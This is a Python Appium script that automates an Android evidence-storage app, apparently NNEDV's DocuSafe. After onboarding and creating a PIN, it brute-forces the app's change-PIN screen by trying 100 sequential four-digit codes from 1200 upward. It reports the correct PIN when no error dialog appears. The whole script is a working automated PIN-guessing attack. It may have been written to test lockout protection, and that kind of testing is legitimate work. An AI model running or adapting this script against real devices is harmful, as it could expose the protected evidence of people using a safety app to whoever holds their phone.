#import time
#import unittest
from appium import webdriver
#from appium.webdriver.common.touch_action import TouchAction


desired_cap ={
"platformName": "Android",
"deviceName": "Android Emulator",
"platformVersion": "10",
"appPackage": "org.nnedv.evc.android.docusafe",
"appActivity": "org.nnedv.evc.android.ui.landing.LoginActivity",
"newCommandTimeout": 600
}

driver = webdriver.Remote("http://localhost:4723/wd/hub",desired_cap)
driver.implicitly_wait(10)

#continue
driver.find_element_by_id("org.nnedv.evc.android.docusafe:id/splash_continue").click()

#close
driver.find_element_by_id("org.nnedv.evc.android.docusafe:id/onboarding_close").click()


#sign in
driver.find_element_by_id("org.nnedv.evc.android.docusafe:id/welcome_sign_in").click()

#sleect account
#self.driver.find_element_by_xpath("//android.widget.LinearLayout[@bounds='[138,1086][942,1244]']").click()
driver.find_element_by_id("com.google.android.gms:id/account_particle_disc").click()

#canel
driver.find_element_by_id("android:id/button2").click()
        

#send keys
for i in range(1, 5):
    driver.find_element_by_id(f"org.nnedv.evc.android.docusafe:id/login_pin_code_{i}").send_keys(i)


#checkbox
driver.find_element_by_id("org.nnedv.evc.android.docusafe:id/login_terms_checkbox").click()

#create pin code
driver.find_element_by_id("org.nnedv.evc.android.docusafe:id/create_btn_container").click()

#canel
driver.find_element_by_id("android:id/button2").click()
driver.find_element_by_id("android:id/button2").click()


#more   
driver.find_element_by_xpath("//android.widget.FrameLayout[@content-desc= 'More']/android.widget.ImageView").click()

#change pin
driver.find_element_by_xpath("/hierarchy/android.widget.FrameLayout/android.widget.LinearLayout/android.widget.FrameLayout/android.widget.LinearLayout/android.widget.FrameLayout/android.widget.RelativeLayout/android.view.ViewGroup/android.widget.FrameLayout[2]/android.view.ViewGroup/androidx.recyclerview.widget.RecyclerView/android.view.ViewGroup[9]/android.widget.TextView").click()

n = 1200
for j in range(100):
    nums = list(str(n))
    for i in range(1, 5):
        driver.find_element_by_id(f"org.nnedv.evc.android.docusafe:id/login_pin_code_{i}").clear()
        driver.find_element_by_id(f"org.nnedv.evc.android.docusafe:id/login_pin_code_{i}").send_keys(nums[i-1])
    

    driver.find_element_by_id("org.nnedv.evc.android.docusafe:id/change_pin_action_btn").click()

    
    try :
        driver.find_element_by_id("android:id/button1").click()
    except :
        print(f"{n} was the correct pin")
        driver.quit()
    
    n += 1
